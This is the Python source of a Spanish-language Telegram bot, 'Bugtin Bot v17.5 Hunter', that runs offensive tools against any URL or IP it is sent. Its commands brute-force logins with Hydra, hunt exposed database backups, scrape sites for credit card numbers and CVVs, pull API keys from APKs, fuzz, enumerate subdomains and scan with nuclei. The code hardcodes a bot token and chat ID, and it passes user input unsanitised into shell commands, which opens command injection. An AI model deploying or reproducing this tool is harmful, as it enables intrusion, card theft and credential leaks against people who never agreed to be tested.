import telebot
from telebot import types
import subprocess
import os
import time
import re
import threading

# --- CONFIGURACIÓN ---
TOKEN = "8760818918:AAEPZfrcH5L5qVLHymarv0e-IfljRfyb9rY"
YOUR_CHAT_ID = "6280594821"

bot = telebot.TeleBot(TOKEN)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# --- CARGA DE TUS DICCIONARIOS ESPECÍFICOS ---
def obtener_wordlist_maestra():
    """Une tus archivos de GitHub para no fallar en el escaneo"""
    archivos = ["logins.txt", "api-routes.txt", "tecnico.txt", "common.txt"]
    maestra_path = os.path.join(BASE_DIR, "maestra.txt")
    
    with open(maestra_path, "w") as out:
        out.write("index\nlogin\nadmin\nconfig\nconn\ndb\nsetup\napi\nsql\n.env\n")
        for f in archivos:
            p = os.path.join(BASE_DIR, f)
            if os.path.exists(p):
                with open(p, "r") as src:
                    out.write(src.read() + "\n")
    return maestra_path

# --- UTILIDADES DE ENVÍO ---
def ejecutar_en_hilo(func, message):
    threading.Thread(target=func, args=(message,)).start()

def enviar_reporte(chat_id, ruta, caption):
    for _ in range(12):
        if os.path.exists(ruta) and os.path.getsize(ruta) > 0:
            break
        time.sleep(1)

    if os.path.exists(ruta) and os.path.getsize(ruta) > 0:
        try:
            with open(ruta, "rb") as f:
                bot.send_document(chat_id, f, caption=caption, parse_mode="Markdown")
            os.remove(ruta)
        except Exception as e:
            bot.send_message(chat_id, f"❌ Error enviando: {str(e)}")
    else:
        if os.path.exists(ruta): os.remove(ruta)
        bot.send_message(chat_id, "⚠️ No se encontraron resultados. Verifica la URL o el diccionario.")

# --- COMANDOS RECON ---

@bot.message_handler(commands=['dir'])
def cmd_dir(message):
    msg = bot.send_message(message.chat.id, "📂 **URL para buscar PHP/HTML/Directorios:**")
    bot.register_next_step_handler(msg, lambda m: ejecutar_en_hilo(do_dir, m))

def do_dir(message):
    url = message.text.strip()
    path = os.path.join(BASE_DIR, f"res_dir_{int(time.time())}.txt")
    wordlist = obtener_wordlist_maestra()
    bot.send_message(message.chat.id, "🚀 Escaneando archivos .php y .html...")
    # Se eliminó --wildcard porque tu versión de gobuster no lo soporta. 
    # Se usa -x para buscar extensiones específicas.
    cmd = f"gobuster dir -u {url} -w {wordlist} -x php,html,txt,bak,json -o {path} -k --no-error"
    subprocess.run(cmd, shell=True)
    enviar_reporte(message.chat.id, path, f"📂 Hallazgos en `{url}`")

@bot.message_handler(commands=['buscar_cc'])
def cmd_cc(message):
    msg = bot.send_message(message.chat.id, "💳 **URL para buscar CC en la Web:**")
    bot.register_next_step_handler(msg, lambda m: ejecutar_en_hilo(do_cc, m))

def do_cc(message):
    url = message.text.strip()
    path = os.path.join(BASE_DIR, f"cc_{int(time.time())}.txt")
    bot.send_message(message.chat.id, "💳 Buscando patrones de tarjetas en código y JS...")
    regex = r'[3-5][0-9]{12,15}|[0-9]{2}/[0-9]{2,4}|cvv[":\s]+[0-9]{3,4}'
    cmd = f"katana -u {url} -silent -jc -d 2 | xargs curl -sL | grep -E -o '{regex}' > {path}"
    subprocess.run(cmd, shell=True)
    enviar_reporte(message.chat.id, path, f"💳 Reporte CC: `{url}`")

@bot.message_handler(commands=['buscar_db'])
def cmd_db(message):
    msg = bot.send_message(message.chat.id, "🗄️ **URL para buscar Bases de Datos:**")
    bot.register_next_step_handler(msg, lambda m: ejecutar_en_hilo(do_db, m))

def do_db(message):
    url = message.text.strip()
    path = os.path.join(BASE_DIR, f"db_{int(time.time())}.txt")
    wordlist = obtener_wordlist_maestra()
    bot.send_message(message.chat.id, "🔍 Buscando .sql, .xls y backups...")
    cmd = f"gobuster dir -u {url} -w {wordlist} -x sql,xls,xlsx,bak,zip,db -o {path} -k --no-error"
    subprocess.run(cmd, shell=True)
    enviar_reporte(message.chat.id, path, f"🗄️ Reporte DB: `{url}`")

@bot.message_handler(commands=['apk'])
def cmd_apk(message):
    msg = bot.send_message(message.chat.id, "📱 **Sube el APK ahora:**")
    bot.register_next_step_handler(msg, lambda m: ejecutar_en_hilo(do_apk, m))

def do_apk(message):
    if not message.document: return
    info = bot.get_file(message.document.file_id)
    raw = bot.download_file(info.file_path)
    tmp = os.path.join(BASE_DIR, "analisis.apk")
    res = os.path.join(BASE_DIR, "apk_secrets.txt")
    with open(tmp, 'wb') as f: f.write(raw)
    # r'' delante de las comillas evita los SyntaxWarnings en Termux
    regex = r'http[s]?://[^\s\'"]+|[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|AIza[0-9A-Za-z-_]{35}'
    subprocess.run(f"strings '{tmp}' | grep -E '{regex}' > '{res}'", shell=True)
    if os.path.exists(tmp): os.remove(tmp)
    enviar_reporte(message.chat.id, res, "📱 Secretos del APK")

@bot.message_handler(commands=['fuerza'])
def cmd_hydra(message):
    msg = bot.send_message(message.chat.id, "⚡ **Formato: [IP] [Servicio] [Usuario]**")
    bot.register_next_step_handler(msg, lambda m: ejecutar_en_hilo(do_hydra, m))

def do_hydra(message):
    try:
        ip, svc, usr = message.text.split()
        report = os.path.join(BASE_DIR, f"hydra_{ip}.txt")
        bot.send_message(message.chat.id, f"⚡ Brute Force en {ip}...")
        subprocess.run(f"hydra -l {usr} -P passwords.txt {ip} {svc} -o {report}", shell=True)
        enviar_reporte(message.chat.id, report, f"⚡ Hydra: {ip}")
    except:
        bot.send_message(message.chat.id, "❌ Error. Usa: `IP Servicio Usuario`")

@bot.message_handler(commands=['fuzz'])
def cmd_fuzz(message):
    msg = bot.send_message(message.chat.id, "🔍 **URL con FUZZ:**")
    bot.register_next_step_handler(msg, lambda m: ejecutar_en_hilo(do_fuzz, m))

def do_fuzz(message):
    url = message.text.strip()
    path = os.path.join(BASE_DIR, "fuzz_res.txt")
    subprocess.run(f"ffuf -u {url} -w {obtener_wordlist_maestra()} -mc 200,403 -o {path}", shell=True)
    enviar_reporte(message.chat.id, path, "🔍 FFUF")

@bot.message_handler(commands=['crawl'])
def cmd_crawl(message):
    msg = bot.send_message(message.chat.id, "🕸️ **URL para Crawling:**")
    bot.register_next_step_handler(msg, lambda m: ejecutar_en_hilo(do_crawl, m))

def do_crawl(message):
    target = message.text.strip()
    path = os.path.join(BASE_DIR, "crawl_res.txt")
    subprocess.run(f"katana -u {target} -silent -o {path}", shell=True)
    enviar_reporte(message.chat.id, path, "🕸️ Katana")

@bot.message_handler(commands=['subs'])
def cmd_subs(message):
    msg = bot.send_message(message.chat.id, "📡 **Dominio:**")
    bot.register_next_step_handler(msg, lambda m: ejecutar_en_hilo(do_subs, m))

def do_subs(message):
    target = message.text.strip()
    path = os.path.join(BASE_DIR, "subs_res.txt")
    subprocess.run(f"subfinder -d {target} -silent -o {path}", shell=True)
    enviar_reporte(message.chat.id, path, "📡 Subdominios")

@bot.message_handler(commands=['auditar'])
def cmd_audit(message):
    msg = bot.send_message(message.chat.id, "🔓 **URL para Nuclei:**")
    bot.register_next_step_handler(msg, lambda m: ejecutar_en_hilo(do_audit, m))

def do_audit(message):
    target = message.text.strip()
    path = os.path.join(BASE_DIR, "audit_res.txt")
    subprocess.run(f"nuclei -u {target} -silent -o {path}", shell=True)
    enviar_reporte(message.chat.id, path, "📄 Vulnerabilidades")

@bot.message_handler(commands=['help', 'start'])
def cmd_help(message):
    if str(message.chat.id) == YOUR_CHAT_ID:
        txt = (
            "🚀 **Bugtin Bot v17.5 Hunter**\n\n"
            "📂 `/dir` - PHP/HTML/Directorios\n"
            "💳 `/buscar_cc` - CC en Web\n"
            "🗄️ `/buscar_db` - SQL/Backups\n"
            "📱 `/apk` - Analizar APK\n"
            "⚡ `/fuerza` - Brute Force\n"
            "🔍 `/fuzz` - Fuzzing\n"
            "🕸️ `/crawl` - Crawling\n"
            "📡 `/subs` - Subdominios\n"
            "🔓 `/auditar` - Vulnerabilidades"
        )
        bot.send_message(message.chat.id, txt, parse_mode="Markdown")

if __name__ == "__main__":
    print("🚀 Bugtin Bot v17.5 Pro Hunter Online - Correcciones Aplicadas")
    bot.polling(none_stop=True)
